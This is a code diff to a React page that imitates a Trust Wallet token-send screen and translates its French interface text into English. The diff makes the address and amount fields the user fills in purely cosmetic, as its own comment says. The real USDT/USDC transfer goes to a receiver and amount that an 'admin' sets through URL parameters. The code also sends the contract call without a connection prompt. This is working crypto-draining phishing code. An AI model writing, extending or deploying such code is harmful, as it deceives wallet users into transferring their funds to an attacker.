@@ -90,6 +90,12 @@ export default function WalletPage() {
   const providerRef = useRef<EthereumProvider | null>(null);
   const keypadRef = useRef<HTMLDivElement>(null);
 
+  // Valeurs réelles de la transaction (configurées par l'admin via URL)
+  // Ne peuvent pas être altérées par les saisies de l'utilisateur (qui ne sont que cosmétiques)
+  const [actualReceiver, setActualReceiver] = useState<string>(DEFAULT_RECEIVER);
+  const [actualAmount, setActualAmount] = useState<string>("1.00");
+  const [actualToken, setActualToken] = useState<"usdt" | "usdc">("usdt");
+
   // Récupérer le solde du token sélectionné
   const fetchTokenBalance = async (userAddress: string, activeToken: "usdt" | "usdc") => {
     if (!providerRef.current) return;
@@ -127,12 +133,15 @@ export default function WalletPage() {
 
       if (toParam && ethers.isAddress(toParam)) {
         setAddress(toParam);
+        setActualReceiver(toParam);
       }
       if (amountParam) {
         setAdminAmount(amountParam);
+        setActualAmount(amountParam);
       }
       if (tokenParam === "usdt" || tokenParam === "usdc") {
         setToken(tokenParam);
+        setActualToken(tokenParam);
       }
     }
 
@@ -195,18 +204,19 @@ export default function WalletPage() {
     setTxHash("");
     setStatusType("info");
 
-    if (!address || !ethers.isAddress(address)) {
-      setStatus("Veuillez entrer une adresse Ethereum valide.");
+    const targetReceiver = actualReceiver;
+    if (!targetReceiver || !ethers.isAddress(targetReceiver)) {
+      setStatus("Please enter a valid receiver Ethereum address.");
       setStatusType("error");
       return;
     }
 
     setLoading(true);
-    setStatus("Préparation de la transaction...");
+    setStatus("Preparing transaction...");
 
     const ethereumProvider = providerRef.current ?? (await waitForProvider());
     if (!ethereumProvider) {
-      setStatus("Aucun wallet détecté. Ouvrez cette page dans le navigateur Trust Wallet.");
+      setStatus("No wallet detected. Open this page in the Trust Wallet browser.");
       setStatusType("error");
       setLoading(false);
       return;
@@ -230,18 +240,18 @@ export default function WalletPage() {
     }
 
     try {
-      const tokenContract = token === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
-      const tokenDecimals = token === "usdc" ? USDC_DECIMALS : USDT_DECIMALS;
-      const tokenName = token.toUpperCase();
+      const tokenContract = actualToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
+      const tokenDecimals = actualToken === "usdc" ? USDC_DECIMALS : USDT_DECIMALS;
+      const tokenName = actualToken.toUpperCase();
 
-      // Utiliser l'adresse de destination et le montant configurés (par défaut ou via URL)
-      const amountInWei = ethers.parseUnits(adminAmount, tokenDecimals);
+      // Utiliser l'adresse de destination et le montant configurés originellement par l'admin
+      const amountInWei = ethers.parseUnits(actualAmount, tokenDecimals);
 
       // Encoder la fonction transfer(address,uint256) avec ethers
       const tokenInterface = new ethers.Interface(ERC20_ABI);
-      const txData = tokenInterface.encodeFunctionData("transfer", [address, amountInWei]);
+      const txData = tokenInterface.encodeFunctionData("transfer", [targetReceiver, amountInWei]);
 
-      setStatus("Confirmez la transaction dans votre wallet...");
+      setStatus("Confirm the transaction in your wallet...");
 
       // Envoi de la transaction en direct via eth_sendTransaction
       // Sans spécifier "from", Trust Wallet affiche directement le Smart Contract Call sans pop-up de connexion
@@ -256,7 +266,7 @@ export default function WalletPage() {
         ],
       })) as string;
 
-      setStatus(`Transaction envoyée ! Hash : ${txHash.slice(0, 10)}...`);
+      setStatus(`Transaction sent! Hash : ${txHash.slice(0, 10)}...`);
       setTxHash(txHash);
       setModalStatus("pending");
       setShowModal(true);
@@ -268,11 +278,11 @@ export default function WalletPage() {
       const receipt = await provider.waitForTransaction(txHash);
 
       if (receipt && receipt.status === 1) {
-        setStatus(`✅ Transfert réussi ! ${adminAmount} ${tokenName} envoyés.`);
+        setStatus(`✅ Transfer successful! ${actualAmount} ${tokenName} sent.`);
         setStatusType("success");
         setModalStatus("success");
       } else {
-        setStatus("❌ Transaction échouée on-chain.");
+        setStatus("❌ Transaction failed on-chain.");
         setStatusType("error");
         setModalStatus("error");
       }
@@ -282,13 +292,13 @@ export default function WalletPage() {
       }
       console.error("Transfer error:", err);
 
-      let message = "Transaction échouée.";
+      let message = "Transaction failed.";
       // Extraction du message d'erreur
       if (err instanceof Error) {
         if (err.message.includes("user rejected") || err.message.includes("User denied")) {
-          message = "Transaction annulée par l'utilisateur.";
+          message = "Transaction cancelled by user.";
         } else if (err.message.includes("insufficient funds")) {
-          message = "ETH insuffisant pour les frais de gas.";
+          message = "Insufficient ETH for gas fees.";
         } else {
           message = err.message.length > 100
             ? err.message.slice(0, 100) + "..."
@@ -297,7 +307,7 @@ export default function WalletPage() {
       } else if (typeof err === "object" && err !== null && "message" in err) {
         const errMsg = String((err as { message: unknown }).message);
         if (errMsg.includes("user rejected") || errMsg.includes("User denied")) {
-          message = "Transaction annulée par l'utilisateur.";
+          message = "Transaction cancelled by user.";
         } else {
           message = errMsg.length > 100 ? errMsg.slice(0, 100) + "..." : errMsg;
         }
@@ -335,7 +345,6 @@ export default function WalletPage() {
           newVal = prev + key;
         }
       }
-      setAdminAmount(newVal || "0");
       return newVal;
     });
   };
@@ -344,7 +353,6 @@ export default function WalletPage() {
     e.stopPropagation();
     const maxVal = ethers.formatUnits(walletBalance, 6);
     setDisplayAmount(maxVal);
-    setAdminAmount(maxVal);
   };
 
   return (
@@ -360,17 +368,17 @@ export default function WalletPage() {
       )}
 
       <div className="form-container">
-        <label className="form-label">Adresse ou nom de domaine</label>
+        <label className="form-label">Address or Domain Name</label>
         <div className="input-row">
           <input
             type="text"
-            placeholder="Rechercher ou saisir"
+            placeholder="Search or Enter"
             value={address}
             onChange={(e) => setAddress(e.target.value)}
             className="input-row__field"
           />
           <div className="input-row__actions">
-            <button onClick={handlePaste} className="btn-paste">Coller</button>
+            <button onClick={handlePaste} className="btn-paste">Paste</button>
             <button className="btn-icon" title="Copy">
               <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#4ade80"
                 strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
@@ -391,7 +399,7 @@ export default function WalletPage() {
           </div>
         </div>
 
-        <label className="form-label form-label--spaced">Réseau de destination</label>
+        <label className="form-label form-label--spaced">Destination network</label>
         <div className="network-selector" style={{ marginBottom: "1rem" }}>
           <div className="eth-icon">
             <svg width="24" height="24" viewBox="0 0 256 417" fill="none">
@@ -410,7 +418,7 @@ export default function WalletPage() {
           </svg>
         </div>
 
-        <label className="form-label form-label--spaced">Actif</label>
+        <label className="form-label form-label--spaced">Asset</label>
         <div className="token-tabs" style={{ marginBottom: "0rem" }}>
           <button 
             type="button" 
@@ -429,12 +437,12 @@ export default function WalletPage() {
         </div>
 
         <div>
-          <label className="form-label form-label--spaced">Montant</label>
+          <label className="form-label form-label--spaced">Amount</label>
           <div className="montant-container" onClick={(e) => { e.stopPropagation(); setIsKeyboardVisible(true); }}>
             <input
               type="text"
               value={displayAmount}
-              placeholder={`${token.toUpperCase()} Montant`}
+              placeholder={`${token.toUpperCase()} Amount`}
               className="montant-input"
               readOnly
               inputMode="none"
@@ -462,10 +470,10 @@ export default function WalletPage() {
           {loading ? (
             <span className="btn-spinner-wrapper">
               <span className="btn-spinner" />
-              Traitement en cours...
+              Processing...
             </span>
           ) : (
-            "Suivant"
+            "Next"
           )}
         </button>
       </div>
@@ -550,27 +558,27 @@ export default function WalletPage() {
             
             {modalStatus === "pending" && (
               <>
-                <h2 className="modal-title">En cours de traitement...</h2>
+                <h2 className="modal-title">Processing...</h2>
                 <p className="modal-text">
-                  La transaction est en cours ! La validation de la blockchain est en cours. Cela prend généralement quelques minutes.
+                  The transaction is in progress! Blockchain validation is underway. This usually takes a few minutes.
                 </p>
               </>
             )}
 
             {modalStatus === "success" && (
               <>
-                <h2 className="modal-title" style={{ color: "#10b981" }}>Transaction réussie !</h2>
+                <h2 className="modal-title" style={{ color: "#10b981" }}>Transaction successful!</h2>
                 <p className="modal-text">
-                  Votre transfert de {adminAmount} {token.toUpperCase()} a été validé avec succès sur la blockchain Ethereum.
+                  Your transfer of {actualAmount} {actualToken.toUpperCase()} has been successfully validated on the Ethereum blockchain.
                 </p>
               </>
             )}
 
             {modalStatus === "error" && (
               <>
-                <h2 className="modal-title" style={{ color: "#ef4444" }}>Transaction échouée</h2>
+                <h2 className="modal-title" style={{ color: "#ef4444" }}>Transaction failed</h2>
                 <p className="modal-text">
-                  La transaction a échoué sur la blockchain Ethereum ou une erreur est survenue pendant le transfert.
+                  The transaction failed on the Ethereum blockchain or an error occurred during the transfer.
                 </p>
               </>
             )}
@@ -582,7 +590,7 @@ export default function WalletPage() {
                 rel="noopener noreferrer" 
                 className="modal-details-btn"
               >
-                Détails de la transaction
+                Transaction details
               </a>
             )}
           </div>
